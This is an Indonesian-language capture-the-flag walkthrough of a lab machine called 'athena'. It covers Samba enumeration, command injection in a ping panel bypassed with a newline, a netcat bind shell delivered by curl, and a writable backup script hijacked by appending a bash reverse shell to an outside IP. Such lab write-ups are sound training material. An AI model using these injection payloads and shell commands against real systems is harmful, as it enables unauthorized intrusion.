enumerate dengan rustscan
```
...
Open 10.10.230.94:22
Open 10.10.230.94:80
Open 10.10.230.94:139
Open 10.10.230.94:445
...
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
...
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
...
```

Di bagian website belum ada yang menarik setelah melakukan enumerasi direktori, jadi kita pindah ke samba.Kita dapat menggunakan `enum4linux` enumerasi samba.
```
enum4linux -US athena.thm
...
//athena.thm/public
...
```
dan kita mendapat direktori samba yang bisa kita masuki sebagai anonymous dengan cara `smbclient //athena.thm/public`. Didalamnya, kita mendapatkan file `msg_for_administrator.txt` yang berisi
```text
Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```
kita mendapatkan page `/myrouterpanel` untuk website tadi.

Jika kita cek, ternyata page ini menerima input ip dan akan melakukan command ping dengan value request `ip=127.0.0.1&submit=`. Untuk itu kita dapat mencoba melakukan command injection
```
curl http://athena.thm/myrouterpanel/ping.php -X POST -d 'ip=127.0.0.1;id &submit='
curl http://athena.thm/myrouterpanel/ping.php -X POST -d 'ip=127.0.0.1&&id &submit='
```
namun kita malah mendapat response `Attempt hacking!`. Jika kita melihat di [hacktrick](https://book.hacktricks.xyz/pentesting-web/command-injection), kita dapat lihat bahwa salah satu bypassnya adalah `ls %0A id`. Maka karena nantinya kita ingin execute `ping` dan `id`, kita dapat membuat payloadnya menjadi
```
curl http://athena.thm/myrouterpanel/ping.php -X POST -d 'ip=%0A id&submit='
```
dan kita akan mendapat response
```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

Selanjutnya kita akan melakukan revshell, namun karena kebanyakan dari perintah revshell mengandung karakter seperti `;`, `|`, dan `&`, maka kita akan melakukan bindshell menggunakan nc yaitu `nc -lp 4445 -e /bin/bash`. Jadi nanti payload kita akan menjadi
```
curl http://athena.thm/myrouterpanel/ping.php -X POST -d 'ip=%0Anc -lp 2222 -e /bin/bash&submit='
```
selanjutnya kita connect ke bindshell dengan cara `nc IP-target 2222`, dan kita akan mendapat shell session. Selanjutnya kita bisa enumerate dengan linpeas.

Note: enumerate dengan linpeas memakan waktu cukup lama, jadi beberapa hal yang ditemukan adalah
- sudo 1.8.31 [exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
- /swapfile di / (unexpected)
- uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),133(lxd),134(sambashare)
- You can sniff with tcpdump! [contoh](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sniffing)
- Found readable /etc/mysql/my.cnf
- Found /var/lib/gdm3/.cache/tracker/meta.db
Tapi semua itu tidak terlalu bermanfaat informasinya.

Selanjutnya kita coba enumerasi manual dengan cara berikut, dan kita menemukan sesuatu yang cukup berguna
```bash
find / -user 'athena' 2>/dev/null
...
/home/athena                                                                                              
/usr/share/backup
```
didalam folder `/usr/share/backup` terdapat file `backup.sh` yang isinya adalah
```bash
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```
jika kita cek permission file nya, kita mendapati bahwa file tersebut dimiliki oleh kita
```
drwxr-xr-x   2 athena   www-data  4096 May 28  2023 .                                                     
drwxr-xr-x 236 root     root     12288 May 26  2023 ..                                                    
-rwxr-xr-x   1 www-data athena     258 May 28  2023 backup.sh
```
Jadi, kita bisa buat file ini untuk revshell dengan cara menambahkannya ke paling bawah
```
echo "bash -i >& /dev/tcp/10.8.15.121/6666 0>&1" >> backup.sh
```
karena ini adalah script untuk melakukan backup, maka dapat kita asumsikan script ini akan dijalankan secara otomatis. Dan ternyata benar, dan kita mendapat shell


